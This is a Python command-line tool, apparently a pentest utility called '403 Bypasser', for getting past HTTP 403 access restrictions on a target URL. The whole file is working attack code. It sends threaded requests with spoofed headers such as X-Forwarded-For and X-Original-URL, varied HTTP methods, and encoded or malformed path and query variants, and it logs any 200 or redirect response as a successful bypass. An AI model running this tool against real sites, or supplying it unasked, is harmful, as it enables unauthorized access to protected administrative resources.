import requests
from requests.exceptions import RequestException, Timeout
import pyfiglet
from termcolor import colored
import time
import random
import os
import logging
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse


class ColoredFormatter(logging.Formatter):
    def format(self, record):
        level_colors = {
            logging.ERROR: 'red',
            logging.WARNING: 'yellow',
            logging.INFO: 'cyan',
            logging.DEBUG: 'blue'
        }
        color = level_colors.get(record.levelno, 'white')
        record.msg = colored(record.msg, color)
        return super().format(record)

# Logger setup
def setup_logger(log_file):
    logger = logging.getLogger(__name__)
    handler = logging.StreamHandler()
    file_handler = logging.FileHandler(log_file)
    formatter = ColoredFormatter('%(asctime)s - %(levelname)s - %(message)s')

    handler.setFormatter(formatter)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(handler)
    logger.addHandler(file_handler)
    logger.setLevel(logging.INFO)
    return logger

logger = setup_logger("bypass_log.txt")

# banner
def display_banner():
    banner_text = pyfiglet.figlet_format("403 Bypasser")
    print(colored(banner_text, "cyan"))
    print(colored("by 77r4sed", "yellow", attrs=["bold"]))

# Advanced argument parsing for CLI
def parse_args():
    parser = argparse.ArgumentParser(description="Advanced 403 Bypass Tool")
    parser.add_argument("url", help="Target URL to test for bypass")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads for parallel bypass attempts")
    parser.add_argument("-p", "--proxy", help="Proxy to use in format: http://proxy:port")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds")
    parser.add_argument("--retries", type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument("--log", help="Log file (default: bypass_log.txt)", default="bypass_log.txt")
    parser.add_argument("--config", help="Load additional headers and paths from a configuration file")
    return parser.parse_args()

# Headers and methods for bypass attempts
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
]

BYPASS_HEADERS = [
    {"User-Agent": random.choice(USER_AGENTS)},
    {"Referer": "https://google.com"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

BYPASS_METHODS = ["GET", "POST", "OPTIONS", "HEAD", "TRACE", "PUT"]

# Path bypass patterns
PATH_BYPASS_PATTERNS = [
    "/{path}/", "/{path}/.", "//{path}//", "/./{path}/..", "/;/{path}", "/.;/{path}",
    "/{path}.json", "/%2e/{path}", "/%252e/{path}", "/%ef%bc%8f{path}"
]

QUERY_PARAM_BYPASS = [
    "?bypass=true", "?access=granted", "?debug=1", "?q=", "?;={path}", "?redirect={path}"
]

# Additional encoding manipulations
ADDITIONAL_ENCODINGS = [
    "/%3b{path}", "/%5c{path}", "/%23{path}",
]

# Function to log results to a file
def log_results(successful_bypasses, log_file="bypass_log.txt"):
    with open(log_file, "a") as file:
        for bypass in successful_bypasses:
            file.write(f"{bypass}\n")
    logger.info(f"Results logged to {log_file}")

# Bypass logic
def attempt_bypass(url, retries=3, timeout=5, proxy=None):
    successful_bypasses = []
    original_path = url.rstrip('/').split('/')[-1]
    base_url = url[:url.rfind(original_path)]

    # Session setup
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    def request_with_logging(bypass_url, headers=None, method="GET"):
        for attempt in range(retries):
            try:
                response = session.request(method, bypass_url, headers=headers, timeout=timeout)
                if response.status_code in [200, 301, 302]:
                    success_message = f"Bypass succeeded with {method}: {bypass_url} (Status: {response.status_code})"
                    logger.info(success_message)
                    successful_bypasses.append(success_message)
                    break
                else:
                    logger.debug(f"Bypass failed with {method}: {bypass_url} (Status: {response.status_code})")
            except (RequestException, Timeout) as e:
                logger.error(f"Error with {method} {bypass_url}: {e}")
                time.sleep(2 ** attempt)  # Exponential backoff for retries

    # Threading for path and query bypasses
    def thread_bypass(patterns, bypass_type="path"):
        with ThreadPoolExecutor(max_workers=5) as executor:
            for pattern in patterns:
                if bypass_type == "path":
                    bypass_url = base_url + pattern.format(path=original_path)
                elif bypass_type == "query":
                    bypass_url = url + pattern.format(path=original_path)
                executor.submit(request_with_logging, bypass_url)

    # Path and query-based bypasses
    thread_bypass(PATH_BYPASS_PATTERNS, "path")
    thread_bypass(QUERY_PARAM_BYPASS, "query")

    # Header-based and HTTP method bypasses
    for headers in BYPASS_HEADERS:
        headers['User-Agent'] = random.choice(USER_AGENTS)
        request_with_logging(url, headers=headers)
    for method in BYPASS_METHODS:
        request_with_logging(url, method=method)

    if successful_bypasses:
        log_results(successful_bypasses)
    return successful_bypasses

if __name__ == "__main__":
    try:
        args = parse_args()
        display_banner()
        logger = setup_logger(args.log)

        logger.info(f"Attempting 403 bypass for {args.url}...")
        result = attempt_bypass(args.url, retries=args.retries, timeout=args.timeout, proxy=args.proxy)

        if not result:
            logger.error("All bypass attempts failed.")
    except KeyboardInterrupt:
        logger.warning("Process interrupted. Exiting gracefully...")
